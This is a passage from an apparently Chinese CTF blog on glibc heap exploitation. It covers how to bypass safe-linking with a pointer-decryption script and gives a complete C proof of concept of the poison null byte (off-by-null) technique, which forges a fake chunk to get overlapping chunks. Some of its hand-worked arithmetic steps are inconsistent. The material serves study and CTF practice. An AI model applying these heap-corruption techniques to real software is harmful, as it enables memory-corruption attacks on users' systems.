<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加密</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 原理: A:fd;B:(pos&gt;&gt;12);C:(ptr); A=B^C; C=A^B;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/eg.png"
                      alt="eg"
                ></p>
<p><code>P</code> 表示将保存在空闲块的 <code>fd</code> 字段中的指针值。<code>L</code> 表示 <code>fd</code> 字段本身的地址。<code>L&gt;&gt;12</code>是 <code>L</code> 的右移值，用于对 <code>P</code> 进行异或运算，从而产生一个编码指针<code>P&#39;</code>。<code>Safe Linking</code> 将这个<code>P&#39;</code>值存储在 <code>fd</code> 字段中。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094308974.png"
                      alt="image-20231016094308974"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094240180.png"
                      alt="image-20231016094240180"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094355521.png"
                      alt="image-20231016094355521"
                ></p>
<p><code>bypass safe-linking</code>机制需要用到 <code>uaf</code>或者 <code>double free</code> 之类的漏洞, 同时释放 <code>tcache</code>到一个空闲 <code>tacahe bin</code>中, 此时由于<code>tcache bin</code> 中没有空闲<code>chunk</code>, <code>tcache-&gt;entry[tc_idx]=0</code>，若存在 <code>uaf</code> 或者 <code>double free</code>，可以泄露出 <code>leak_addr= (&amp;tcache_chunk-&gt;fd)&gt;&gt;12</code> 位置, 则 <code>heap_base=leak_addr&lt;&lt;12</code>。<code>double free</code> 需要将 <code>tcache_chunk_bk</code> 改为 <code>0</code>，绕过检查。对于 <code>2.32</code>及以后的 <code>glibc</code> 版本的 <code>tcache_poisoning</code> 需要将 <code>target</code> 地址进行加密。</p>
<h3 id="调试-25"><a href="#调试-25" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016095050228.png"
                      alt="image-20231016095050228"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016095208868.png"
                      alt="image-20231016095208868"
                ></p>
<p>申请<code>a,b</code>两个 <code>tcache_chunk</code>，最后一个 <code>chunk_0x10</code> 用于隔离，下面解析 <code>b_fd</code>。</p>
<ul>
<li>解密脚本:</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher</span>):</span><br><span class="line">    key=<span class="number">0</span></span><br><span class="line">    plain=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">        bits= <span class="number">64</span>-<span class="number">12</span>*(i)</span><br><span class="line">        <span class="keyword">if</span>(bits&lt;<span class="number">0</span>):</span><br><span class="line">            bits=<span class="number">0</span></span><br><span class="line">        plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits</span><br><span class="line">        key = plain &gt;&gt; <span class="number">12</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;round %d:\n&quot;</span>%(i))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key:    %#016lx\n&quot;</span>%key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plain:  %#016lx\n&quot;</span>%plain)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;cipher: %#016lx\n\n&quot;</span>%cipher)</span><br></pre></td></tr></table></figure></div>

<ul>
<li>原理:</li>
</ul>
<p>前置:</p>
<p><code>P:0x0000_555_555_55b_2a0; L:0x0000_555_555_55b_2d0; L&gt;&gt;12:0x0000_000_555_555_55b; p&#39;:0x0000_555_000_00e_7fb</code></p>
<p><code>(0x55555555b2d0 &gt;&gt; 12) = 0x55555555B; 0x55555555b2a0 ^ 0x55555555B = 0x55500000E7FB;</code></p>
<p>步骤:</p>
<p><code>P ^ (L &gt;&gt; 12);</code>。 此时 <code>L</code> 高 <code>12</code> 位为 <code>0</code>，而 <code>P</code> 高 <code>12</code> 位为 <code>0x555</code>，异或时将保留 <code>0x0000_555</code>，而异或操作又是可逆的，所以用保留的 <code>0x0000_555_000_000_000</code> 和 低位 <code>0x0000_000_555_000_000</code> 取异或即可得到低三位的真实地址，以此类推有了以下步骤。</p>
<p>1. </p>
<p><code>bits = 52; </code></p>
<p><code>key = 0; </code></p>
<p><code>plain = ((0x0000_555_000_00e_7fb ^ 0) &gt;&gt; 52) &lt;&lt; 52 = 0x000_000_000_000_0000; </code></p>
<p><code>key = plain &gt;&gt; 12 = 0;</code></p>
<p>2. </p>
<p><code>bits = 40; </code></p>
<p><code>key = 0; </code></p>
<p><code>plain = ((0x0000_555_000_00e_7fb ^ 0) &gt;&gt; 40) &lt;&lt; 40 = 0x000_055_000_000_0000; </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_000_055_000_000_0</code> </p>
<p>3. </p>
<p><code>bits = 28; </code></p>
<p><code>key = 0x000_000_055_000_000_0; </code></p>
<p><code>plain = ((0x000_055_500_000_e7fb ^ 0x000_000_055_000_000_0) &gt;&gt; 28) &lt;&lt; 28 = 0x000_055_555_000_0000  </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_000_055_555_0000;</code></p>
<p>4. </p>
<p><code>bits = 16; </code></p>
<p><code>key = 0x000_000_055_555_0000; </code></p>
<p><code>plain = ((0x000_055_500_000_e7fb ^ 0x000_000_055_555_0000) &gt;&gt; 28) &lt;&lt; 28 = 0x000_055_555_555_0000  </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_000_055_555_5550;</code></p>
<p>5. </p>
<p><code>bits = 4; </code></p>
<p><code>key = 0x000_000_055_555_5550; </code></p>
<p><code>plain = ((0x000_055_500_000_e7fb ^ 0x000_000_055_555_5550) &gt;&gt; 28) &lt;&lt; 28 = 0x000_055_555_555_b2a0  </code></p>
<p><code>key = plain &gt;&gt; 12 = 0x000_055_555_555_b;</code></p>
<h2 id="poison-null-byte（glibc-2-28）"><a href="#poison-null-byte（glibc-2-28）" class="headerlink" title="poison_null_byte（glibc &gt; 2.28）"></a>poison_null_byte（glibc &gt; 2.28）</h2><h4 id="源码-26"><a href="#源码-26" class="headerlink" title="源码"></a>源码</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Welcome to poison null byte!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Tested in Ubuntu 20.04 64bit.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Some of the implementation details are borrowed from https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/off_by_null.c\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step1: allocate padding</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Step1: allocate a large padding so that the fake chunk&#x27;s addresses&#x27;s lowest 2nd byte is \\x00&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line">	<span class="type">void</span> *heap_base = (<span class="type">void</span> *)((<span class="type">long</span>)tmp &amp; (~<span class="number">0xfff</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;heap address: %p\n&quot;</span>, heap_base);</span><br><span class="line">	<span class="type">size_t</span> size = <span class="number">0x10000</span> - ((<span class="type">long</span>)tmp&amp;<span class="number">0xffff</span>) - <span class="number">0x20</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Calculate padding chunk size: 0x%lx\n&quot;</span>, size);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Allocate the padding. This is required to avoid a 4-bit bruteforce because we are going to overwrite least significant two bytes.&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *padding= <span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step2: allocate prev chunk and victim chunk</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep2: allocate two chunks adjacent to each other.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s call the first one &#x27;prev&#x27; and the second one &#x27;victim&#x27;.&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="type">void</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;prev chunk: malloc(0x500) = %p\n&quot;</span>, prev);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;victim chunk: malloc(0x4f0) = %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step3: link prev into largebin</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep3: Link prev into largebin&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This step is necessary for us to forge a fake chunk later&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The fd_nextsize of prev and bk_nextsize of prev will be the fd and bck pointers of the fake chunk&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;allocate a chunk &#x27;a&#x27; with size a little bit smaller than prev&#x27;s&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *a = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: malloc(0x4f0) = %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;allocate a chunk &#x27;b&#x27; with size a little bit larger than prev&#x27;s&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: malloc(0x510) = %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;malloc(0x10) to avoid consolidation&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nCurrent Heap Layout\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;    ... ...\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;padding\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;    prev Chunk(addr=0x??0010, size=0x510)\n&quot;</span></span><br><span class="line">     	 <span class="string">&quot;  victim Chunk(addr=0x??0520, size=0x500)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot; barrier Chunk(addr=0x??0a20, size=0x20)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;       a Chunk(addr=0x??0a40, size=0x500)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot; barrier Chunk(addr=0x??0f40, size=0x20)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;       b Chunk(addr=0x??0f60, size=0x520)\n&quot;</span></span><br><span class="line">		 <span class="string">&quot; barrier Chunk(addr=0x??1480, size=0x20)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now free a, b, prev&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">free</span>(prev);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;current unsorted_bin:  header &lt;-&gt; [prev, size=0x510] &lt;-&gt; [b, size=0x520] &lt;-&gt; [a, size=0x500]\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Allocate a huge chunk to enable sorting&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;current large_bin:  header &lt;-&gt; [b, size=0x520] &lt;-&gt; [prev, size=0x510] &lt;-&gt; [a, size=0x500]\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This will add a, b and prev to largebin\nNow prev is in largebin&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The fd_nextsize of prev points to a: %p\n&quot;</span>, ((<span class="type">void</span> **)prev)[<span class="number">2</span>]+<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The bk_nextsize of prev points to b: %p\n&quot;</span>, ((<span class="type">void</span> **)prev)[<span class="number">3</span>]+<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step4: allocate prev again to construct fake chunk</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep4: Allocate prev again to construct the fake chunk&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Since large chunk is sorted by size and a&#x27;s size is smaller than prev&#x27;s,&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;we can allocate 0x500 as before to take prev out&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *prev2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;prev2: malloc(0x500) = %p\n&quot;</span>, prev2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now prev2 == prev, prev2-&gt;fd == prev2-&gt;fd_nextsize == a, and prev2-&gt;bk == prev2-&gt;bk_nextsize == b&quot;</span>);</span><br><span class="line">	assert(prev == prev2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The fake chunk is contained in prev and the size is smaller than prev&#x27;s size by 0x10&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;So set its size to 0x501 (0x510-0x10 | flag)&quot;</span>);</span><br><span class="line">	((<span class="type">long</span> *)prev)[<span class="number">1</span>] = <span class="number">0x501</span>;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And set its prev_size(next_chunk) to 0x500 to bypass the size==prev_size(next_chunk) check&quot;</span>);</span><br><span class="line">	*(<span class="type">long</span> *)(prev + <span class="number">0x500</span>) = <span class="number">0x500</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The fake chunk should be at: %p\n&quot;</span>, prev + <span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;use prev&#x27;s fd_nextsize &amp; bk_nextsize as fake_chunk&#x27;s fd &amp; bk&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now we have fake_chunk-&gt;fd == a and fake_chunk-&gt;bk == b&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step5: bypass unlinking</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep5: Manipulate residual pointers to bypass unlinking later.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Take b out first by allocating 0x510&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *b2 = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Because of the residual pointers in b, b-&gt;fd points to a right now: %p\n&quot;</span>, ((<span class="type">void</span> **)b2)[<span class="number">0</span>]+<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We can overwrite the least significant two bytes to make it our fake chunk.\n&quot;</span></span><br><span class="line">			<span class="string">&quot;If the lowest 2nd byte is not \\x00, we need to guess what to write now\n&quot;</span>);</span><br><span class="line">	((<span class="type">char</span>*)b2)[<span class="number">0</span>] = <span class="string">&#x27;\x10&#x27;</span>;</span><br><span class="line">	((<span class="type">char</span>*)b2)[<span class="number">1</span>] = <span class="string">&#x27;\x00&#x27;</span>;  <span class="comment">// b-&gt;fd &lt;- fake_chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the overwrite, b-&gt;fd is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="type">void</span> **)b2)[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;To do the same to a, we can move it to unsorted bin first&quot;</span></span><br><span class="line">			<span class="string">&quot;by taking it out from largebin and free it into unsortedbin&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *a2 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">free</span>(a2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now free victim into unsortedbin so that a-&gt;bck points to victim&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a-&gt;bck: %p, victim: %p\n&quot;</span>, ((<span class="type">void</span> **)a)[<span class="number">1</span>], victim);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Again, we take a out and overwrite a-&gt;bck to fake chunk&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *a3 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	((<span class="type">char</span>*)a3)[<span class="number">8</span>] = <span class="string">&#x27;\x10&#x27;</span>;</span><br><span class="line">	((<span class="type">char</span>*)a3)[<span class="number">9</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the overwrite, a-&gt;bck is: %p, which is the chunk pointer to our fake chunk\n&quot;</span>, ((<span class="type">void</span> **)a3)[<span class="number">1</span>]);</span><br><span class="line">	<span class="comment">// pass unlink_chunk in malloc.c:</span></span><br><span class="line">	<span class="comment">//      mchunkptr fd = p-&gt;fd;</span></span><br><span class="line">	<span class="comment">//      mchunkptr bk = p-&gt;bk;</span></span><br><span class="line">	<span class="comment">//      if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))</span></span><br><span class="line">	<span class="comment">//          malloc_printerr (&quot;corrupted double-linked list&quot;);</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;And we have:\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;fake_chunk-&gt;fd-&gt;bk == a-&gt;bk == fake_chunk\n&quot;</span></span><br><span class="line">		 <span class="string">&quot;fake_chunk-&gt;bk-&gt;fd == b-&gt;fd == fake_chunk\n&quot;</span></span><br><span class="line">		 );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step6: add fake chunk into unsorted bin by off-by-null</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\nStep6: Use backward consolidation to add fake chunk into unsortedbin&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Take victim out from unsortedbin&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *victim2 = <span class="built_in">malloc</span>(<span class="number">0x4f0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, victim2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;off-by-null into the size of vicim&quot;</span>);</span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line">	((<span class="type">char</span> *)victim2)[<span class="number">-8</span>] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">	<span class="comment">/* VULNERABILITY */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now if we free victim, libc will think the fake chunk is a free chunk above victim\n&quot;</span></span><br><span class="line">			<span class="string">&quot;It will try to backward consolidate victim with our fake chunk by unlinking the fake chunk then\n&quot;</span></span><br><span class="line">			<span class="string">&quot;add the merged chunk into unsortedbin.&quot;</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;For our fake chunk, because of what we did in step4,\n&quot;</span></span><br><span class="line">			<span class="string">&quot;now P-&gt;fd-&gt;bk(%p) == P(%p), P-&gt;bk-&gt;fd(%p) == P(%p)\n&quot;</span></span><br><span class="line">			<span class="string">&quot;so the unlink will succeed\n&quot;</span>, ((<span class="type">void</span> **)a3)[<span class="number">1</span>], prev, ((<span class="type">void</span> **)b2)[<span class="number">0</span>], prev);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;After freeing the victim, the new merged chunk is added to unsorted bin&quot;</span></span><br><span class="line">			<span class="string">&quot;And it is overlapped with the prev chunk&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// step7: validate the chunk overlapping</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Now let&#x27;s validate the chunk overlapping&quot;</span>);</span><br><span class="line">	<span class="type">void</span> *merged = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;merged: malloc(0x100) = %p\n&quot;</span>, merged);</span><br><span class="line">	<span class="built_in">memset</span>(merged, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now merged&#x27;s content: %s\n&quot;</span>, (<span class="type">char</span> *)merged);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Overwrite prev&#x27;s content&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(prev2, <span class="string">&#x27;C&#x27;</span>, <span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;merged&#x27;s content has changed to: %s\n&quot;</span>, (<span class="type">char</span> *)merged);</span><br><span class="line"></span><br><span class="line">	assert(<span class="built_in">strstr</span>(merged, <span class="string">&quot;CCCCCCCCC&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="基础知识-4"><a href="#基础知识-4" class="headerlink" title="基础知识"></a>基础知识</h4><p><code>2.29</code>后的<code>libc</code>在两个<code>free chunk</code> 进行合并前多一次对<code>prevsize</code>的值检查对应的源代码如下:</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="调试-26"><a href="#调试-26" class="headerlink" title="调试"></a>调试</h4>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn_Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>FUZZ专题</title>
    <url>/2024/02/14/FUZZ%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ef6b0bad89bd81ea5d46333a62536a4378b4b445d7f1ea1e4dccd0e8c880b193">2d806215ddc7c4fd1f6babc1a9ab678d6b15992746f26bfdbdf0a2f49fb26f63d479e637eae3b4c263955e20718ead88425721e59897576ca2ea7d87397cf595622433febed7f2acedcd78abc227bd6f9c15c23aa3661fae896ec9b986cf10dfc9dec7e0b35bb99e8b64e1a7e92107e9e71936f11ef09ca51c1526bf6a46f1824df2cfe4e42081606d83bad30c6f09c2a137ff51a4b2b70392f4b980c014dbf4adbb1feb45fb289a6d887ee1ffa34a7a9bfba365b4d64478b61738f3558d70a9ab14f9c973061e0d352cc6efc44cd3dcbdc9686ae26196611946e0e3d13b56825f8983bc14716c6f462c4cc7a6319318d612d701752058e5fdee74c9bbe4c418617433573ca267d8468a1690e24dcff2a8663bbc0b7715a7b085767de92d6ce15184d8d5cafac82a151a7c749a95dd52d2add86165d7630dff62167e33e3e2cfd5066d65cf2ad331a38264aadf1d3c72264eb551daeb8d19bd0e8655a4f011a342a642bc7b47b80c3c52894f76d7b378c9e07af984222b3bb8d746ab428e6d6b3995bb3baee8dcb373e0124096bef672d4f316bb7b7ea1c08d1b786a89ce8bc5542708eb916cec89d4b7edc38a2a5862bcf8fae8a77ebde22c9416a19c0e8c0081bb71b4ec70bc859bb091855d19ca261d7df3e259968efbb0402ea1da6a3bcc37f144d3085307d61165e5781991b7e303c58b3c7743f1eb1b22d512b44e4526e48832830abd10d25e010fa70be8fc550620db07f7e09c20d0e1af023164f7e66c3430a0417f95c364d55a2951243af33b9f83300725f5686b1f82ded79c3e2d0d2199a06d77ed049697d54cffc7ec224b814141b139bf9e768ee3b488d9c01ab3f967a1a0c6835a1d1a3c59282805cf324be436912cac18e24dba2541f988c670a9baf9ac6099a1ca040cd64b696cd1d862d5ada3d18c7094bb9f8433a8d2decf21299c875e08fd125f66f1b1b0c354f2227696d2a67d9042221e1fdc1ac296fb8b811b9235f9792c2f357e8cd4fa7e44bd4742f2e9e9146a20cb1bd33871b6bf32dd89d36b199c11d285975f5219cadeee1e373ab2a050e25a776cd4eb0fc0d34b27d1749a3350e0f0b94d800a70d81938c267e0c48ca2a40d1ccae57ae55a6fa2265f4a626524922e46870f2a224cc68dfb89b9f0d47e69d42cf06be86d626f4799b92e8b55b8b3baa5f39e9ceb1ca727d60f70418786cc374d1a9f8dc3840efdaf0ad9ee692879b56cfa3cec54ca8496a22f121ec9a9adf61e6e81dd56f48375795e7cb303c51272bb8936afa1099caa68f9c7d5db1063e355a196c6e485ea35bd0fd4df14c7911ddff9f4b37682a8cc2099fc27c1fbe67d2b5d5b84e8597f9c41dda0dae71d727e6b2d64556ce9d4274c5e65d60dbbba4e6fa6688228794267748d3264ec8b8bf0126701f6bf0e9be730eeae11b03d881c93495a1f322273b956af9b46ed33a7f2c7319a548071732931174b7b0377af587c946aee8436cc51